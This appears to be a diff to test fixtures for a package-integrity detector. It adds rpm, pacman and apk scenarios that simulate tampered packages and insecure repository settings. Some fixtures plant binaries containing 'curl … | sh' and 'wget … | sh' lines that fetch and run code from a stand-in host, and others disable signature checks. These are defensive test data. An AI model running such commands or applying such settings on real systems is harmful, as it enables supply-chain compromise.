@@ -96,8 +96,10 @@ class FixtureHost:
         path = self.root / relative.lstrip("/")
         path.parent.mkdir(parents=True, exist_ok=True)
         path.write_text(text)
-        if mode is not None:
-            path.chmod(mode)
+        # Always explicit: the process umask is not part of the scenario
+        # (safety.create_run_directory sets 0o077 process-wide in the CLI and
+        # in some tests), and pacman/apk mode records are compared with disk.
+        path.chmod(0o644 if mode is None else mode)
         return path
 
     def home_file(self, relative: str, text: str, mode: int | None = None) -> Path:
@@ -520,35 +522,154 @@ def _(h: FixtureHost) -> None:
 
 
 # ---- packages ---------------------------------------------------------------------------------
-@scenario("apt_source_trusted_yes", "positive", "INSECURE_APT_REPOSITORY_SETTING", "T1195")
+@scenario("apt_source_trusted_yes", "positive", "INSECURE_PACKAGE_SOURCE_SETTING", "T1195")
 def _(h: FixtureHost) -> None:
     h.file("/etc/apt/sources.list.d/vendor.list", "deb [trusted=yes] http://198.51.100.9/apt stable main\n")
 
 
-@scenario("apt_source_signed_by", "benign", "INSECURE_APT_REPOSITORY_SETTING")
+@scenario("apt_source_signed_by", "benign", "INSECURE_PACKAGE_SOURCE_SETTING")
 def _(h: FixtureHost) -> None:
     h.file("/etc/apt/sources.list.d/vendor.sources", "Types: deb\nURIs: https://pkg.example\nSuites: stable\n"
            "Components: main\nSigned-By: /usr/share/keyrings/vendor.gpg\n")
 
 
-@scenario("dpkg_binary_drift", "positive", "DPKG_FILE_DRIFT", "T1554")
+@scenario("dpkg_binary_drift", "positive", "PACKAGE_FILE_DRIFT", "T1554")
 def _(h: FixtureHost) -> None:
     h.command_output("dpkg", "??5??????   /usr/bin/sudo\n", "FAILED", 1)
 
 
-@scenario("dpkg_conffile_changed", "positive", "DPKG_CONFFILE_CHANGED")
+@scenario("dpkg_conffile_changed", "positive", "PACKAGE_CONFFILE_CHANGED")
 def _(h: FixtureHost) -> None:
     h.command_output("dpkg", "??5?????? c /etc/ssh/sshd_config\n", "FAILED", 1)
 
 
-@scenario("dpkg_files_missing", "positive", "DPKG_FILES_MISSING")
+@scenario("dpkg_files_missing", "positive", "PACKAGE_FILES_MISSING")
 def _(h: FixtureHost) -> None:
     h.command_output("dpkg", "missing     /lib/modules/6.5.0-old/kernel/fs/x.ko\n", "FAILED", 1)
 
 
-@scenario("dpkg_unreadable_is_not_drift", "benign", ("DPKG_FILE_DRIFT", "DPKG_FILES_MISSING", "DPKG_CONFFILE_CHANGED"))
+@scenario("dpkg_unreadable_is_not_drift", "benign", ("PACKAGE_FILE_DRIFT", "PACKAGE_FILES_MISSING", "PACKAGE_CONFFILE_CHANGED"))
 def _(h: FixtureHost) -> None:
     h.command_output("dpkg", "missing     /etc/shadow (Permission denied)\n??????????  /usr/bin/su\n", "FAILED", 1)
+
+
+# ---- packages: rpm / dnf (Fedora, RHEL) ----------------------------------------------------------
+def _rpm_host(h: FixtureHost) -> None:
+    h.file("/var/lib/rpm/Packages", "")  # presence of the database is what the detector checks
+    h.file("/etc/yum.repos.d/fedora.repo", "[fedora]\nname=Fedora\nbaseurl=https://mirror.example/\ngpgcheck=1\n")
+
+
+@scenario("rpm_binary_drift", "positive", "PACKAGE_FILE_DRIFT", "T1554")
+def _(h: FixtureHost) -> None:
+    _rpm_host(h)
+    h.command_output("rpm", "S.5....T.    /usr/bin/sudo\n", "FAILED", 1)
+
+
+@scenario("rpm_mode_changed_only", "positive", "PACKAGE_METADATA_DRIFT", "T1548.001")
+def _(h: FixtureHost) -> None:
+    _rpm_host(h)
+    h.command_output("rpm", ".M.......    /usr/bin/su\n", "FAILED", 1)
+
+
+@scenario("rpm_clean_verify", "benign", ("PACKAGE_FILE_DRIFT", "PACKAGE_METADATA_DRIFT", "PACKAGE_FILES_MISSING"))
+def _(h: FixtureHost) -> None:
+    _rpm_host(h)
+    h.command_output("rpm", "", "COMPLETED", 0)
+
+
+@scenario("dnf_gpgcheck_off", "positive", "INSECURE_PACKAGE_SOURCE_SETTING", "T1195.002")
+def _(h: FixtureHost) -> None:
+    _rpm_host(h)
+    h.file("/etc/yum.repos.d/vendor.repo", "[vendor]\nname=Vendor\nbaseurl=http://198.51.100.9/rpm\ngpgcheck=0\nsslverify=0\n")
+
+
+# ---- packages: pacman (Arch) -----------------------------------------------------------------------
+def _pacman_host(h: FixtureHost, binary: bytes, conf: bytes = b"[hello]\n") -> None:
+    import gzip
+    import hashlib
+    sha_bin = hashlib.sha256(binary).hexdigest()
+    sha_conf = hashlib.sha256(conf).hexdigest()
+    mtree = ("#mtree\n/set type=file uid=0 gid=0 mode=644\n"
+             "./.BUILDINFO time=1.0 size=1 sha256digest=" + "0" * 64 + "\n"
+             "./usr type=dir\n./usr/bin type=dir\n"
+             f"./usr/bin/hello mode=755 size={len(binary)} sha256digest={sha_bin}\n"
+             "./etc type=dir\n"
+             f"./etc/hello.conf size={len(conf)} sha256digest={sha_conf}\n")
+    folder = h.root / "var/lib/pacman/local/hello-1.0-1"
+    folder.mkdir(parents=True, exist_ok=True)
+    (folder / "mtree").write_bytes(gzip.compress(mtree.encode(), mtime=0))
+    (folder / "desc").write_text("%NAME%\nhello\n")
+    h.file("/etc/pacman.conf", "[options]\nSigLevel = Required DatabaseOptional\n[core]\nInclude = /etc/pacman.d/mirrorlist\n")
+
+
+@scenario("pacman_binary_drift", "positive", "PACKAGE_FILE_DRIFT", "T1554")
+def _(h: FixtureHost) -> None:
+    _pacman_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/usr/bin/hello", "#!/bin/sh\ncurl http://198.51.100.9/x | sh\n", 0o755)
+    h.file("/etc/hello.conf", "[hello]\n")
+
+
+@scenario("pacman_conffile_changed", "positive", "PACKAGE_CONFFILE_CHANGED")
+def _(h: FixtureHost) -> None:
+    _pacman_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
+    h.file("/etc/hello.conf", "[hello]\ncolor = yes\n")
+
+
+@scenario("pacman_binary_missing", "positive", "PACKAGE_FILES_MISSING")
+def _(h: FixtureHost) -> None:
+    _pacman_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/etc/hello.conf", "[hello]\n")
+
+
+@scenario("pacman_binary_mode_changed", "positive", "PACKAGE_METADATA_DRIFT", "T1548.001")
+def _(h: FixtureHost) -> None:
+    _pacman_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o4755)
+    h.file("/etc/hello.conf", "[hello]\n")
+
+
+@scenario("pacman_clean", "benign", ("PACKAGE_FILE_DRIFT", "PACKAGE_CONFFILE_CHANGED", "PACKAGE_FILES_MISSING", "PACKAGE_METADATA_DRIFT"))
+def _(h: FixtureHost) -> None:
+    _pacman_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
+    h.file("/etc/hello.conf", "[hello]\n")
+
+
+@scenario("pacman_siglevel_never", "positive", "INSECURE_PACKAGE_SOURCE_SETTING", "T1195.002")
+def _(h: FixtureHost) -> None:
+    _pacman_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
+    h.file("/etc/hello.conf", "[hello]\n")
+    h.file("/etc/pacman.conf", "[options]\nSigLevel = Never\n")
+
+
+# ---- packages: apk (Alpine) ---------------------------------------------------------------------------
+def _apk_host(h: FixtureHost, binary: bytes) -> None:
+    import base64
+    import hashlib
+    digest = base64.b64encode(hashlib.sha1(binary, usedforsecurity=False).digest()).decode()
+    h.file("/lib/apk/db/installed", f"P:hello\nV:1.0-r0\nF:usr/bin\nR:hello\na:0:0:755\nZ:Q1{digest}\n\n")
+    h.file("/etc/apk/repositories", "https://dl-cdn.alpinelinux.org/alpine/v3.20/main\n")
+
+
+@scenario("apk_binary_drift", "positive", "PACKAGE_FILE_DRIFT", "T1554")
+def _(h: FixtureHost) -> None:
+    _apk_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/usr/bin/hello", "#!/bin/sh\nwget -qO- http://198.51.100.9/x | sh\n", 0o755)
+
+
+@scenario("apk_clean", "benign", ("PACKAGE_FILE_DRIFT", "PACKAGE_FILES_MISSING", "PACKAGE_METADATA_DRIFT"))
+def _(h: FixtureHost) -> None:
+    _apk_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
+
+
+@scenario("apk_allow_untrusted", "positive", "INSECURE_PACKAGE_SOURCE_SETTING", "T1195.002")
+def _(h: FixtureHost) -> None:
+    _apk_host(h, b"#!/bin/sh\necho hello\n")
+    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
+    h.file("/etc/apk/repositories", "https://dl-cdn.alpinelinux.org/alpine/v3.20/main --allow-untrusted\n")
 
 
 # ---- runner --------------------------------------------------------------------------------------
